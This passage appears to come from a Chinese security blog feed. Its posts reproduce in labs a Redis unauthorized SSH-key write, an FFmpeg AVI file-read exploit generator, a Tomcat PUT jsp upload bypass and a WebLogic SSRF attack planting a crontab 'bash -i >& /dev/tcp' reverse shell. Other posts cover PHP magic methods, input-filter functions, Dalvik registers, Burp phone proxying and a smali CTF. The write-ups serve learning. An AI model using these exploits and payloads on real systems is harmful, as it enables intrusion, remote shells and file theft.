    <content type="text"><![CDATA[0x01 漏洞简介Redis服务器默认绑定在0.0.0.0:6379，这会导致redis暴露在公网上，在未经过认证的情况下，任何人都可以进行登录。攻击者可以通过向redis上写入公钥，再利用私钥进行登录。 利用redis的config命令，可以向服务器上写文件，攻击者通过将自己的公钥写入到服务器的/root/.ssh文件夹下的authroized_key文件中，即可成功登录到目标服务器。 0x02 漏洞复现首先，生成自己的公钥和私钥1ssh-keygen -t rsa 会在/root/.ssh下生成id_rsa(私钥)、id_rsa.pub(公钥) 然后将公钥写入到一个txt中1(echo -e &quot;\n\n&quot;;cat id_rsa.pub;echo -e &quot;\n\n&quot;) &gt; pino.txt 之后将该文件的内容通过redis的config命令写入到服务器上123456cat pino.txt|redis-cli -h 192.168.3.55 -x set pinoredis-cli -h 192.168.3.55&gt;config set dir /root/.ssh&gt;config set dbfilename &quot;authroized_keys&quot;&gt;save&gt;exit 到目前为止我们已经把自己的公钥上传到了服务器上了，这个时候就可以通过私钥来进行ssh登录了。 1ssh -i id_rsa root@192.168.3.55 就可以成功登录到服务器了。 0x03 遇到的问题及解决方案如果之前一切顺利后却发现最后一步ssh登录报错了，如下：sign_and_send_pubkey: signing failed: agent refused operation 可以通过12eval &quot;$(ssh-agent -s)&quot;ssh-add 解决 如果还有什么问题，欢迎私信交流～]]></content>
      <categories>
        <category>漏洞分析与复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>Redis</tag>
        <tag>未授权访问</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[FFMPEG 任意文件读取漏洞]]></title>
    <url>%2F2018%2F06%2F19%2FFFMPEG%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E8%AF%BB%E5%8F%96%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[0x01 漏洞用途如果某场景使用ffmpeg版本小于3.2.4，并且有上传用户自定义avi视频的时候，利用该漏洞可以读取服务器上任意文件。 0x02制作特殊的avi脚本如下： 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147#!/usr/bin/env python3import structimport argparseimport randomimport stringAVI_HEADER = b&quot;RIFF\x00\x00\x00\x00AVI LIST\x14\x01\x00\x00hdrlavih8\x00\x00\x00@\x9c\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x10\x00\x00\x00&#125;\x00\x00\x00\x00\x00\x00\x00\x02\x00\x00\x00\x00\x00\x00\x00\xe0\x00\x00\x00\xa0\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00LISTt\x00\x00\x00strlstrh8\x00\x00\x00txts\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x01\x00\x00\x00\x19\x00\x00\x00\x00\x00\x00\x00&#125;\x00\x00\x00\x86\x03\x00\x00\x10&apos;\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\xe0\x00\xa0\x00strf(\x00\x00\x00(\x00\x00\x00\xe0\x00\x00\x00\xa0\x00\x00\x00\x01\x00\x18\x00XVID\x00H\x03\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00\x00LIST movi&quot;ECHO_TEMPLATE = &quot;&quot;&quot;### echoing &#123;needed!r&#125;#EXT-X-KEY: METHOD=AES-128, URI=/dev/zero, IV=0x&#123;iv&#125;#EXTINF:1,#EXT-X-BYTERANGE: 16/dev/zero#EXT-X-KEY: METHOD=NONE&quot;&quot;&quot;# AES.new(&apos;\x00&apos;*16).decrypt(&apos;\x00&apos;*16)GAMMA = b&apos;\x14\x0f\x0f\x10\x11\xb5&quot;=yXw\x17\xff\xd9\xec:&apos;FULL_PLAYLIST = &quot;&quot;&quot;#EXTM3U#EXT-X-MEDIA-SEQUENCE:0&#123;content&#125;#### random string to prevent caching: &#123;rand&#125;#EXT-X-ENDLIST&quot;&quot;&quot;EXTERNAL_REFERENCE_PLAYLIST = &quot;&quot;&quot;#### External reference: reading &#123;size&#125; bytes from &#123;filename&#125; (offset &#123;offset&#125;)#EXTINF:1,#EXT-X-BYTERANGE: &#123;size&#125;@&#123;offset&#125;&#123;filename&#125;&quot;&quot;&quot;XBIN_HEADER = b&apos;XBIN\x1A\x20\x00\x0f\x00\x10\x04\x01\x00\x00\x00\x00&apos;def echo_block(block): assert len(block) == 16 iv = &apos;&apos;.join(map(&apos;&#123;:02x&#125;&apos;.format, [x ^ y for (x, y) in zip(block, GAMMA)])) return ECHO_TEMPLATE.format(needed=block, iv=iv)def gen_xbin_sync(): seq = [] for i in range(60): if i % 2: seq.append(0) else: seq.append(128 + 64 - i - 1) for i in range(4, 0, -1): seq.append(128 + i - 1) seq.append(0) seq.append(0) for i in range(12, 0, -1): seq.append(128 + i - 1) seq.append(0) seq.append(0) return seqdef test_xbin_sync(seq): for start_ind in range(64): path = [start_ind] cur_ind = start_ind while cur_ind &lt; len(seq): if seq[cur_ind] == 0: cur_ind += 3 else: assert seq[cur_ind] &amp; (64 + 128) == 128 cur_ind += (seq[cur_ind] &amp; 63) + 3 path.append(cur_ind) assert cur_ind == len(seq), &quot;problem for path &#123;&#125;&quot;.format(path)def echo_seq(s): assert len(s) % 16 == 0 res = [] for i in range(0, len(s), 16): res.append(echo_block(s[i:i + 16])) return &apos;&apos;.join(res)test_xbin_sync(gen_xbin_sync())SYNC = echo_seq(gen_xbin_sync())def make_playlist_avi(playlist, fake_packets=1000, fake_packet_len=3): content = b&apos;GAB2\x00\x02\x00&apos; + b&apos;\x00&apos; * 10 + playlist.encode(&apos;ascii&apos;) packet = b&apos;00tx&apos; + struct.pack(&apos;&lt;I&apos;, len(content)) + content dcpkt = b&apos;00dc&apos; + struct.pack(&apos;&lt;I&apos;, fake_packet_len) + b&apos;\x00&apos; * fake_packet_len return AVI_HEADER + packet + dcpkt * fake_packetsdef gen_xbin_packet_header(size): return bytes([0] * 9 + [1] + [0] * 4 + [128 + size - 1, 10])def gen_xbin_packet_playlist(filename, offset, packet_size): result = [] while packet_size &gt; 0: packet_size -= 16 assert packet_size &gt; 0 part_size = min(packet_size, 64) packet_size -= part_size result.append(echo_block(gen_xbin_packet_header(part_size))) result.append( EXTERNAL_REFERENCE_PLAYLIST.format( size=part_size, offset=offset, filename=filename)) offset += part_size return &apos;&apos;.join(result), offsetdef gen_xbin_playlist(filename_to_read): pls = [echo_block(XBIN_HEADER)] next_delta = 5 for max_offs, filename in ( (5000, filename_to_read), (500, &quot;file:///dev/zero&quot;)): offset = 0 while offset &lt; max_offs: for _ in range(10): pls_part, new_offset = gen_xbin_packet_playlist( filename, offset, 0xf0 - next_delta) pls.append(pls_part) next_delta = 0 offset = new_offset pls.append(SYNC) return FULL_PLAYLIST.format(content=&apos;&apos;.join(pls), rand=&apos;&apos;.join( random.choice(string.ascii_lowercase) for i in range(30)))if __name__ == &quot;__main__&quot;: parser = argparse.ArgumentParser(&apos;AVI+M3U+XBIN ffmpeg exploit generator&apos;) parser.add_argument( &apos;filename&apos;, help=&apos;filename to be read from the server (prefix it with &quot;file://&quot;)&apos;) parser.add_argument(&apos;output_avi&apos;, help=&apos;where to save the avi&apos;) args = parser.parse_args() assert &apos;://&apos; in args.filename, &quot;ffmpeg needs explicit proto (forgot file://?)&quot; content = gen_xbin_playlist(args.filename) avi = make_playlist_avi(content) output_name = args.output_avi with open(output_name, &apos;wb&apos;) as f: f.write(avi) 使用命令1python3 gen_avi.py file:///etc/passwd poc.avi 获得poc.avi用来上传文件 0x03 漏洞复现首先复现环境使用pthithon的vulhub，项目地址https://github.com/vulhub/vulhub/tree/master/ffmpeg/phdays 12docker-compose builddocker-compose up -d 运行好环境后访问http://localhost:8080即可 这里是一个上传点，然后将之前构造好的上传文件上传后，提交，播放上传的视频即可获得/etc/passwd文件的内容]]></content>
      <categories>
        <category>漏洞分析与复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>FFMPEG</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CVE-2017-12615 Tomcat任意文件上传漏洞]]></title>
    <url>%2F2018%2F06%2F19%2FCVE-2017-12615-Tomcat%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%2F</url>
    <content type="text"><![CDATA[0x01 漏洞复现本次复现的漏洞如题，是一个任意文件文件上传漏洞，但是此处的上传不需要页面有一个上传功能的界面，而是通过PUT方法来进行上传的。在tomcat下的conf文件夹中有一个web.xml，在其中找到default servlet的配置项，添加如下的配置 重点是readonly的那一项，因为其他的都是默认的，只有那个是自己添加的。 我们来看一下readonly这个选项是用来做什么的吧 也是在这个web.xml文件中，已经注释的地方说明了默认情况下readonly是true，并且如果是true的话，那么PUT和DELETE方法是被拒绝的，因此如果手动将readonly选项开启为false，那么就能够通过PUT方法上传文件了。 但是，当我们想要上传一个jsp木马的时候却发现报了一个405的错误 查阅资料发现，原来default servlet只能处理静态文件，而处理jsp文件是jspservlet，但是只有defaultservlet有PUT上传逻辑，解决的办法是通过构造特殊的后缀名来进行绕过，从而上传jsp木马。 经过验证，可以在文件名后面添加斜杠 / 来进行绕过。 访问上传的木马，成功执行命令！]]></content>
      <categories>
        <category>漏洞分析与复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>Tomcat</tag>
        <tag>任意文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[利用WebLogic SSRF漏洞攻击内网Redis反弹shell]]></title>
    <url>%2F2018%2F06%2F19%2F%E5%88%A9%E7%94%A8WebLogic-SSRF%E6%BC%8F%E6%B4%9E%E6%94%BB%E5%87%BB%E5%86%85%E7%BD%91Redis%E5%8F%8D%E5%BC%B9shell%2F</url>
    <content type="text"><![CDATA[0x01 复现环境公网上存在WebLogic服务，存在SSRF漏洞内网中部署了一台Redis服务器，IP地址为172.21.0.2，端口6379反弹shell需要自己的公网IP总计两个公网IP，一个内网IP 0x02 WebLogic SSRF漏洞WebLogic的SSRF漏洞算是一个比较知名的SSRF漏洞，具体原理可以自行谷歌。本篇主要是通过复现该漏洞来加深对SSRF漏洞的理解。 首先访问WebLogic的漏洞页面地址为1http://xxx.xxx.xxx.xxx:xxxx[这个是WebLogic服务的IP]/uddiexplorer/SearchPublicRegistries.jsp?operator=http://xxx.xxx.xxx.xxxx[这个是想要探测的内网IP]&amp;rdoSearch=name&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search 那么SSRF利用中，大部分第一步肯定是进行内网的端口探测了，当然肯定有IP和端口的探测了，这里内网IP已经给出了，就直接扫端口了，简单的写了一个扫描脚本而已 扫端口得到内网Redis端口为6379，当然这是做实验所以服务是知道的，在实际过程中肯定需要进一步判断的，不过一般都是默认端口吧。。。 这次访问一下6379端口，看看页面如何 看到了下面的一个报错，其实从这个报错就可以判断这个内网Redis服务是存在的，为什么呢？看一下2016乌云大会上猪猪侠师傅介绍的《WebLogic SSRF 服务探测》 我们得到的页面的报错语句刚好符合请求开放的服务的回显，OK，第一步完成 0x03 攻击内网Redis反弹shell在Weblogic的SSRF中，有一个比较大的特点，就是虽然是一个“GET”请求，但是我们可以通过传入%0a%0d来注入换行符，而某些服务（如redis）是通过换行符来分隔每条命令，也就说我们可以通过该SSRF攻击内网中的redis服务器。 第一步探测Redis我们已经完成了，那么第二部就是发送redis命令，将弹shell脚本写入/etc/crontab中，crontab就是linux下的一个定时执行事件的一个程序，不懂的小伙伴可以自行谷歌 命令如下：1set 1 &quot;\n\n\n\n* * * * root bash -i &gt;&amp; /dev/tcp/xx.xx.xx.xx[这里是你自己的公网IP]/8888[这里是你监听的端口] 0&gt;&amp;1\n\n\n\n&quot; config set dir /etc/config set dbfilename crontab save 因为我们是通过GET来发送命令的，因此要将上面的命令进行URL编码，同时我们还要制定一个要写入的文件，这里我就叫做test了，最终的URL如下：1?operator=http://172.21.0.2:6379/test%0D%0A%0D%0Aset%201%20%22%5Cn%5Cn%5Cn%5Cn*%20*%20*%20*%20*%20root%20bash%20-i%20%3E%26%20%2Fdev%2Ftcp%2Fxxx.xxx.xxx.xxx%2F8888%200%3E%261%5Cn%5Cn%5Cn%5Cn%22%0D%0Aconfig%20set%20dir%20%2Fetc%2F%0D%0Aconfig%20set%20dbfilename%20crontab%0D%0Asave%0D%0A%0D%0Aaaa 在自己的公网IP上监听8888端口1nc -l 8888 然后发送请求即可反弹shell了 如果burp的右边出现了你输入的命令的回响，那么证明你发送的命令已经被服务器接受了 反弹shell成功！]]></content>
      <categories>
        <category>漏洞分析与复现</category>
      </categories>
      <tags>
        <tag>漏洞复现</tag>
        <tag>Redis</tag>
        <tag>SSRF</tag>
        <tag>WebLogic</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入浅出PHP中的魔术方法]]></title>
    <url>%2F2018%2F06%2F10%2F%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAPHP%E4%B8%AD%E7%9A%84%E9%AD%94%E6%9C%AF%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[0x01 引子PHP的魔术方法在反序列化漏洞利用中是十分常见的，因此对于深入理解反序列化漏洞来说，理解PHP中常见的魔术方法也是至关重要的，所以在学习php.net文档中的魔术方法后，写篇文章来总结一下。 0x02 __wakeup()和__sleep()在PHP的序列化与反序列化中wakeup()和sleep()这两个魔术方法是必须到知道的。sleep函数是在序列化的时候会被自动调用，而wakeup函数则实在反序列化的时候被调用，对应的序列化的函数是serialize()，而反序列化函数是unserialize()。 那么如何理解自动调用呢？举个例子，在学习其他面向对象语言，例如java，c++的时候，一定听说过construct函数，一般叫做构造函数，构造函数就是当类被实例化的时候会首先执行构造函数，因此sleep和wakeup两个函数也是类似的，当php进行序列化或者反序列化的时候就会执行sleep或者wakeup函数了。 说完自动调用再来细说一下这两个魔术方法吧。首先是__sleep()函数，sleep函数的原型如下 意味着在写该函数的时候要注意需要有一个返回值，并且该返回值的类型是一个数组，而数组的内容是需要被序列化的变量名称，但是如果你没有这个返回值，PHP会报一个N_NOTICE的错误（就是一个警告），并把NULL给序列化了，举个例子看下图： 无返回值结果我们可以看到爆了一个警告，并且在第二行有个N;，这个就是就是NULL被序列化的结果。 有返回值![]/images/深入浅出PHP中的魔术方法4.png)结果 然后就是__wakeup()函数了wakeup函数原型如下 好吧，没什么好说的，就是当执行unserialize()的时候会执行该魔术方法啦。 0x03 __toString()__toString()魔术方法看名字也能懂，就是当对象被当作字符串来使用的时候会调用该魔术方法。什么叫做把对象当作字符串呢？就比如说echo $obj;这样的，我把一个对象echo出来，那么就会调用这个魔术方法啦。 在PHP5.2.0版本之前呢，只有直接使用echo和print才会生效，但是现在什么年代了，5.2.0几乎没有了，所以我们一般只要记得在任何字符串环境都可以的。 __toString()的原型如下： 这个也是有返回值的，不过返回值的类型是String类型的，因此我们在定义该函数的时候一定要记得返回一个字符串。 然后有一点需要记得那就是不能在toString方法中抛出错误，否则会报error的。那么有的同学一定会问什么是抛出错误了，回答一下就是throw一个error了，博主亲自做了实验，还真的会报错。 0x04 __invoke()invoke也是一个比较常用的函数，当对象是用调用函数的方式来使用的时候就会调用invoke魔术方法。那么什么是用调用函数的方式来使用呢？举个例子，一般我们写一个函数，比如function hello($string){….}这么写，然后想要调用这个函数的话就会hello(“hello”)这么来调用，因此呢，把对象使用函数的方式调用就是$obj($string)这样，括号里面是参数，当然也可以没有。obj是一个new好的对象，这样子就会自动调用invoke魔术方法啦。（PS.只有在PHP5.3.0版本以上才有的，当然现在基本都是这个版本以上了吧） 0x05 PHP“重载”系列接下来要总结的是PHP的“重载”系列的魔术方法了。那么细心的小伙伴一定发现我在重载两个字上打了双引号。这是因为在PHP中，重载跟我们以前在java或者c++中见到的重载不太一样。在c++中，重载是指函数名字一样，但是参数和类型是不一样的，但是在PHP中，重载的意思是动态地“创建”类属性和方法。机智的小伙伴发现这里又有双引号了，好吧，这里的创建的意思包括读取和设置两种意思。 那么在PHP中什么时候使用重载呢？答案就是当调用当前环境下未定义或不可见的属性和方法的时候，会调用重载方法。那么现在一定有小伙伴会问，未定义我们可以理解，那什么是不可见的属性和方法呀，这里解释一下，不可见的属性和方法就比如一个变量是private的，那么我在别的类中就无法访问这个变量了，对于别的类中，这个private变量就是不可见吧，那么我访问了这个private变量，就会调用重载方法啦。 现在该正式开始介绍“重载”系列的魔术方法啦。__get()、__set()、__isset()、__unset() 当我们想要读取未定义或不可见属性的时候会自动调用get当我们想要设置未定义或不可见属性的时候会自动调用set当我们对未定义或不可见属性使用isset()或者empty()时会自动调用isset当我们对未定义或不可见属性使用unset()时会自动调用unset __call、__callstatic 当我们调用一个不可访问的方法的时候会自动调用call当我们调用一个不可访问的静态方法的时候会自动调用callstatic（注意访问静态方法的时候使用“类名::方法名”的方式哦~） 0x06 __clone()当我们复制一个对象的时候，会用到clone这个关键字，当复制完成后，会自动调用clone魔术方法。 0x07 参考http://php.net/]]></content>
      <categories>
        <category>PHP安全</category>
      </categories>
      <tags>
        <tag>PHP安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[深入浅出PHP中的Static——静态]]></title>
    <url>%2F2018%2F06%2F10%2F%E6%B7%B1%E5%85%A5%E6%B5%85%E5%87%BAPHP%E4%B8%AD%E7%9A%84Static%E2%80%94%E2%80%94%E9%9D%99%E6%80%81%2F</url>
    <content type="text"><![CDATA[0x01 引子好吧，我不得不承认在写这篇文章之前我对于PHP的静态static的用法只是一知半解，在深入学习了静态的用法后，真的很惭愧，发现以前真的不懂，希望这篇文章能够对看到的读者有所启示（希望你不是跟我一样也是一点也不知道TAT..） 0x02 静态之初试不知道大家是否跟我一样，对于面向对象语言的静态变量其实是听过的，模模糊糊地知道，如果在类中声明了静态变量，那么在函数中操作这个变量，实际上相当于操作这个变量本身，也就是引用，是一个概念的，他不会在函数执行完成后被销毁掉。在这之前，对于静态变量我大概就知道这些吧，那么今天博主带大家再深入理解这个概念吧。 0x03 静态之深入首先要介绍的是，PHP中的静态变量和静态方法是可以在对象没有实例化之前就能使用的，就像这样： 看到没有！！是不是很神奇！！（【捂脸:)】好吧，少见多怪了，大佬勿喷。。）我类A的外面我没有new这个类，只是用了类名加一对冒号接上静态变量和静态方法即可使用12类名::静态变量类名::静态方法 所以说在以前代码审计的时候看到一些用框架写的面向对象的cms，就觉得好像从来没有实例化对象一般，原来是这么回事。。 0x04 静态变量至于使用规则嘛，对于静态变量也没什么好说的了，就是要记住可以在对象没有实例化的时候就可以访问了，可以通过self::静态变量的方式访问本类中的静态变量，当然了，必须在本类的静态方法中使用才行哦~ 0x05 静态方法对于静态方法，规则就比较多了。 静态变量只能通过静态方法来调用就像之前说过的那样，在静态方法中使用self::静态变量的方式可以调用本类中的静态变量，就像这样： 静态方法不能调用非静态变量 静态方法可以调用静态方法 静态方法可以调用非静态方法，但是非静态方法会自动转换为静态方法 我们可以看到，尽管出现了警告，但是hello world!还是echo出来了。]]></content>
      <categories>
        <category>PHP安全</category>
      </categories>
      <tags>
        <tag>PHP安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[PHP内置过滤函数总结]]></title>
    <url>%2F2018%2F06%2F10%2FPHP%E5%86%85%E7%BD%AE%E8%BF%87%E6%BB%A4%E5%87%BD%E6%95%B0%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[0x01 防止SQL注入addslashes()将 单引号（’） 双引号（”） 反斜杠（\） NULL 进行转义 12345678910 &lt;?php$a = $_GET[&apos;a&apos;];$b = addslashes($a);echo &quot;过滤前 ：&quot;;print_r($a);echo &quot;&lt;br /&gt;过滤后 ：&quot;;print_r($b);?&gt; mysql_escape_string()该函数在php4.3的时候被弃用，在php5.3的时候会产生警告，在php7之后彻底移除。 mysql_escape_string不转义%和_ 12345678910&lt;?php$a = $_GET[&apos;a&apos;];$b = mysql_escape_string($a);echo &quot;过滤前 ：&quot;;print_r($a);echo &quot;&lt;br /&gt;过滤后 ：&quot;;print_r($b);?&gt; mysql_real_escape_string()将 单引号（’） 双引号（”） 反斜杠（\） \n \r \x00 \x1a 进行转义 mysql_real_escape_string()函数跟mysql_escape_string函数作用相同，但是mysql_real_escape_string接受的是一个连接句柄并根据当前字符集转移字符串之外。mysql_escape_string() 并不接受连接参数，也不管当前字符集设定。 本函数在php5.5已弃用，在php7之后被移除，应使用Mysqli和PDO_Mysql来替代。 mysqli_real_escape_string()该函数作用与mysql_real_escape_string()函数一样，但是是替代mysql_real_escape_string的。 0x02 防止XSShtmlspecialchars()把预定义的字符转换为html实体12345&amp; (&amp; 符号) &amp;amp;&quot; (双引号) &amp;quot;，除非设置了 ENT_NOQUOTES&apos; (单引号) 设置了 ENT_QUOTES 后， &amp;#039; (如果是 ENT_HTML401) ，或者 &amp;apos; (如果是 ENT_XML1、 ENT_XHTML 或 ENT_HTML5)。&lt; (小于) &amp;lt;&gt; (大于) &amp;gt; 默认情况下：1234567891011&lt;?php$a = $_GET[&apos;a&apos;];$b = htmlspecialchars($a);echo &quot;过滤前 ：&quot;;print_r($a);echo &quot;&lt;br /&gt;过滤后 ：&quot;;print_r($b);?&gt; htmlentities()本函数作用跟htmlspecialchars()一样，但是htmlentites()会转换所有拥有实体的字符。 strip_tag() 去除空字符、HTML 和 PHP 标记后的结果，可以添加第二个参数指定不被去除的字符列表 1234567891011&lt;?php$a = $_GET[&apos;a&apos;];$b = strip_tags($a);echo &quot;过滤前 ：&quot;;print_r($a);echo &quot;&lt;br /&gt;过滤后 ：&quot;;print_r($b);?&gt; 1234567891011&lt;?php$a = $_GET[&apos;a&apos;];$b = strip_tags($a, &apos;&lt;a&gt;&apos;);echo &quot;过滤前 ：&quot;;print_r($a);echo &quot;&lt;br /&gt;过滤后 ：&quot;;print_r($b);?&gt; 0x03 防止命令执行escapeshellcmd()escapeshellcmd() 对字符串中可能会欺骗 shell 命令执行任意命令的字符进行转义。 此函数保证用户输入的数据在传送到 exec() 或 system() 函数，或者 执行操作符 之前进行转义。 反斜线（\）会在以下字符之前插入：1234567891011121314151617&amp;#;`|*?~&lt;、&gt;^(、)[、]&#123;、&#125;$\\x0A\xFF ‘ 和 “ 仅在不配对儿的时候被转义。 在 Windows 平台上，所有这些字符以及 % 和 ! 字符都会被空格代替。 1234567891011&lt;?php$a = $_GET[&apos;a&apos;];$b = escapeshellcmd($a);echo &quot;过滤前 ：&quot;;print_r($a);echo &quot;&lt;br /&gt;过滤后 ：&quot;;print_r($b);?&gt; escapseshellarg()把字符串转码为可以在 shell 命令里使用的参数,escapeshellarg() 将给字符串增加一个单引号并且能引用或者转码任何已经存在的单引号，这样以确保能够直接将一个字符串传入 shell 函数，并且还是确保安全的。对于用户输入的部分参数就应该使用这个函数。shell 函数包含 exec(), system() 执行运算符 1234567891011&lt;?php$a = $_GET[&apos;a&apos;];$b = escapeshellarg($a);echo &quot;过滤前 ：&quot;;print_r($a);echo &quot;&lt;br /&gt;过滤后 ：&quot;;print_r($b);?&gt;]]></content>
      <categories>
        <category>PHP安全</category>
      </categories>
      <tags>
        <tag>PHP安全</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Dalvik的两种不同的寄存器表示方法]]></title>
    <url>%2F2018%2F06%2F10%2FDalvik%E7%9A%84%E4%B8%A4%E7%A7%8D%E4%B8%8D%E5%90%8C%E7%9A%84%E5%AF%84%E5%AD%98%E5%99%A8%E8%A1%A8%E7%A4%BA%E6%96%B9%E6%B3%95%2F</url>
    <content type="text"><![CDATA[0x01 Dalvik的两种不同的寄存器表示方法——v命名法与p命令法在研究安卓逆向的时候，经常在看smali代码中有看到譬如v0啊，p1啊之类的代码，其实这些都表示的是寄存器，只不过表示的方法不同罢了，本文是我学习过程中的笔记吧，算是记录一下。 根据Dalvik虚拟机参数传递方式中的规定：假设一个函数使用到M个寄存器，其中函数的参数是N个，那么参数使用最后的N个寄存器，局部变量使用从头开始的前M-N个寄存器。假设存在一个函数如下12345678910public class Hello&#123; public int foo(int a, int b)&#123; return (a + b) * (a - b); &#125; public static void main(String[] args)&#123; Hello hello = new Hello(); System.out.println(hello.foo(5, 3)); &#125;&#125; 在这段代码代码中，foo函数使用了5个寄存器，2个显示的整形参数，其中foo函数是Hello类的非静态方法，函数被调用是会传入一个隐式的Hello对象引用，因此，实际传入的参数数量是3个。那么局部变量使用前2个寄存器，参数会使用后3个寄存器。 0x02 v命名法v命名法采用以小写字母“v”开头的方式表示函数中用到的局部变量与参数，所有的寄存器命名从v0开始，依次递增。对于foo函数，v命名法会用到v0，v1，v2，v3，v4这五个寄存器，v0和v1表示的是局部变量寄存器，v2表示的是被传入的Hello对象的引用，v3和v4分别表示两个传入的整形参数。 0x03 p命名法p命名法会函数的局部变量寄存器命名没有什么影响，它主要是函数中引入的参数命名从p0开始，依次递增。对于foo函数来说，p命名法会用到v0，v1，p0，p1，p2这五个寄存器，v0和v1表示局部变量寄存器，p0表示的是被传入的Hello对象的引用，p1和p2分别表示两个传入的整形参数。 0x04 参考《Android软件安全与逆向分析》]]></content>
      <categories>
        <category>移动安全</category>
      </categories>
      <tags>
        <tag>移动安全</tag>
        <tag>安卓</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[用Burpsuite抓取手机的流量]]></title>
    <url>%2F2018%2F06%2F10%2F%E7%94%A8Burpsuite%E6%8A%93%E5%8F%96%E6%89%8B%E6%9C%BA%E7%9A%84%E6%B5%81%E9%87%8F%2F</url>
    <content type="text"><![CDATA[##0x01 安装Burpsuite 首先自然是安装Burpsuite了，安装教程网上有很多，这里就不细说了。 打开Burpsuite，在Porxy -&gt; Options 选项中找到Edit，注意一定要先选中里面的条目后才可以进行编辑，在这里要自己设置端口号和选择下面的第二个选项，具体可以看下图 ##0x02 调试手机 安装好了Burpsuite之后同时也将监听端口设置好了那么就该设置手机选项了。 我用的是安卓手机，至于苹果的话待测，不过感觉应该差不多吧。 首先，在调试以前要确保手机和电脑在同一个WIFI下，打开手机的WLAN选项，然后找到连接的WIFI名称，右边可能会有个更多的选项，如下图 点击后找到后选择手动代理，将我们的电脑的IP输进去，端口填上之前在Burpsuite中设置的那个。 如何查看IP的话，Windows在Dos命令下输入ipconfig 找到无线局域网适配器 WLAN选项，其中的IPv4地址就是了。 这只好后打开手机的浏览器，在地址栏中输入http://burp，会出现如下 点击右上角的CA Certifcate下载证书，用来抓https包用的。 下载之后一般来说都在浏览器的目录下，把证书重命名为cacert.cer后移动到手机存储卡或者本机的根目录（一定要根目录，不然无法安装！！！），接着，到手机的 设置-》安全选项中找到从手机存储和SD卡安装选项，点击后手机自动识别我们下载的证书，注意凭据用途一定要选择VPN和应用 然后就OK啦！ 之后如果想要抓包，就在Burpsuite中的Proxy-》Intercept就可以啦，记得点击Intercept is on按钮！我在手机点了一下应用商店，Burpsuite成功抓包了！]]></content>
      <categories>
        <category>移动安全</category>
      </categories>
      <tags>
        <tag>移动安全</tag>
        <tag>工具使用</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Smali]]></title>
    <url>%2F2018%2F06%2F10%2FSmali%2F</url>
    <content type="text"><![CDATA[0x01 题目描述都说学好Smali是学习Android逆向的基础，现在刚好有一个smali文件，大家一起分析一下吧~~ 0x02 题解这道题下载下来是一个smali文件，先用smali2java工具将其转换为java文件，具体工具可以谷歌一个自己用的比较顺手的 转换之后的代码如下：123456789101112131415161718192021222324252627282930313233343536373839404142434445464748/** * Generated by smali2java 1.0.0.558 * Copyright (C) 2013 Hensence.com */package net.bluelotus.tomorrow.easyandroid;import android.util.Base64;import java.io.PrintStream;import java.security.NoSuchAlgorithmException;import javax.crypto.NoSuchPaddingException;import java.security.InvalidKeyException;import javax.crypto.IllegalBlockSizeException;import javax.crypto.BadPaddingException;import javax.crypto.spec.SecretKeySpec;import javax.crypto.Cipher;import java.security.Key;import java.security.GeneralSecurityException;public class Crackme &#123; private String str2 = &quot;cGhyYWNrICBjdGYgMjAxNg==&quot;; public Crackme() &#123; GetFlag(&quot;sSNnx1UKbYrA1+MOrdtDTA==&quot;); &#125; private String GetFlag(String p1) &#123; byte[] &quot;content&quot; = Base64.decode(p1.getBytes(), 0x0); String &quot;kk&quot; = new String(Base64.decode(str2.getBytes(), 0x0)); System.out.println(decrypt(&quot;content&quot;, &quot;kk&quot;)); return null; &#125; private String decrypt(byte[] p1, String p2) &#123; String &quot;m&quot; = 0x0; try &#123; byte[] &quot;keyStr&quot; = p2.getBytes(); SecretKeySpec &quot;key&quot; = new SecretKeySpec(&quot;keyStr&quot;, &quot;AES&quot;); Cipher &quot;cipher&quot; = Cipher.getInstance(&quot;AES/ECB/NoPadding&quot;); &quot;cipher&quot;.init(0x2, &quot;key&quot;); byte[] &quot;result&quot; = &quot;cipher&quot;.doFinal(p1); return &quot;m&quot;; &#125; catch(NoSuchPaddingException &quot;e&quot;) &#123; &quot;e&quot;.printStackTrace(); &#125; return &quot;m&quot;; &#125;&#125; 分析代码，不难发现这是一个AES ECB模式NoPadding填充模式的解密代码，传入GetFlag函数的base64字符串应该就是flag加密后的base64，str2是密钥，因此直接解密即可得到flag]]></content>
      <categories>
        <category>移动安全</category>
      </categories>
      <tags>
        <tag>CTF</tag>
        <tag>移动安全</tag>
        <tag>安卓</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[FindPass]]></title>
    <url>%2F2018%2F06%2F10%2FFindPass%2F</url>
